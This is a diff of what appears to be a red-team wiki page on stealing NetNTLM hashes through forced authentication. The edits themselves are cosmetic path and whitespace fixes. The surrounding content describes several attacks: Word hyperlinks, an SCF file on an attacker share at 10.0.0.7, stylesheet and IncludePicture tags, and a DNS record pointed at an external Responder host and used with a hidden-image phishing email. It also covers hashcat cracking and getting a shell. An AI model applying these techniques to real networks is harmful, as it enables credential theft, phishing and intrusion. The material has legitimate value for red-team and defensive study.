@@ -6,11 +6,11 @@ description: Credential Access, Stealing hashes
 
 ## Execution via Hyperlink
 
-Let's create a Word document that has a hyperlink to our attacking server where  `responder` will be listening on port 445:
+Let's create a Word document that has a hyperlink to our attacking server where `responder` will be listening on port 445:
 
 ![](../../.gitbook/assets/forced-auth-word.png)
 
-{% file src="../../.gitbook/assets/Totes not a scam.docx" %}
+{% file src="../../.gitbook/assets/totes-not-a-scam.docx" %}
 Forced SMBv2 Authentication - MS Word File
 {% endfile %}
 
@@ -34,7 +34,7 @@ hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/shar
 
 Success, the password is cracked:
 
-![](../../.gitbook/assets/forced-auth-cracked.png)
+![](../../.gitbook/assets/forched-auth-cracked.png)
 
 Using the cracked passsword to get a shell on the victim system:
 
@@ -44,7 +44,7 @@ Using the cracked passsword to get a shell on the victim system:
 
 Place the below `fa.scf` file on the attacker controlled machine at `10.0.0.7` in a shared folder `tools`
 
-{% code title="\\10.0.0.7\tools\fa.scf" %}
+{% code title="\10.0.0.7\tools\fa.scf" %}
 ```csharp
 [Shell]
 Command=2
@@ -54,7 +54,7 @@ Command=ToggleDesktop
 ```
 {% endcode %}
 
-{% file src="../../.gitbook/assets/@fa.scf" %}
+{% file src="../../.gitbook/assets/fa.scf" %}
 fa.scf
 {% endfile %}
 
@@ -120,7 +120,7 @@ Executing the file.rtf on the victim system gives away user's hashes:
 
 MS Word Documents can be saved as .xml:
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-09 16-23-39.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-09-16-23-39.png)
 
 This can be exploited by including a tag that requests the document stylesheet (line 3) from an attacker controlled server. The victim system will share its NetNTLM hashes with the attacker when attempting to authenticate to the attacker's system:
 
@@ -132,9 +132,9 @@ This can be exploited by including a tag that requests the document stylesheet (
 
 Below is the attack illustrated:
 
-![](<../../.gitbook/assets/Peek 2018-12-09 16-44.gif>)
+![](../../.gitbook/assets/peek-2018-12-09-16-44.gif)
 
-{% file src="../../.gitbook/assets/test-xls-stylesheet (1).xml" %}
+{% file src="../../.gitbook/assets/test-xls-stylesheet.xml" %}
 test-xls-stylesheet.xml
 {% endfile %}
 
@@ -142,15 +142,15 @@ test-xls-stylesheet.xml
 
 Create a new Word document and insert a new field `IncludePicture`:
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-09 17-01-11.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-09-17-01-11.png)
 
 Save the file as .xml. Note that the sneaky image url is present in the XML:
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-09 17-02-32.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-09-17-02-32.png)
 
 Launching the document gives away victim's hashes immediately:
 
-![](<../../.gitbook/assets/Peek 2018-12-09 17-04.gif>)
+![](../../.gitbook/assets/peek-2018-12-09-17-04.gif)
 
 {% file src="../../.gitbook/assets/smb-image.xml" %}
 smb-image.xml
@@ -163,7 +163,7 @@ If we have a foothold in a network, we can do the following:
 * Create a new DNS A record (any authenticated user can do it) inside the domain, say `offense.local`, you have a foothold in, and point it to your external server, say `1.1.1.1`
   * Use [PowerMad](https://github.com/Kevin-Robertson/Powermad) to do this with: `Invoke-DNSUpdate -dnsname vpn -dnsdata 1.1.1.1`
 * On your controlled server 1.1.1.1, start `Responder` and listen for HTTP connections on port 80
-* Create a phishing email, that contains `<img src="http://vpn.offense.local"/>`&#x20;
+* Create a phishing email, that contains `<img src="http://vpn.offense.local"/>`
   * Feel free to make the image 1x1 px or hidden
   * Note that `http://vpn.offense.local` resolves to `1.1.1.1` (where your Responder is listening on port 80), but only from inside the `offense.local` domain
 * Send the phish to target users from the `offense.local` domain
@@ -207,4 +207,3 @@ Below shows how the Farmer successfully collects a hash from user `spotless` via
 {% embed url="https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html" %}
 
 {% embed url="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/" %}
-
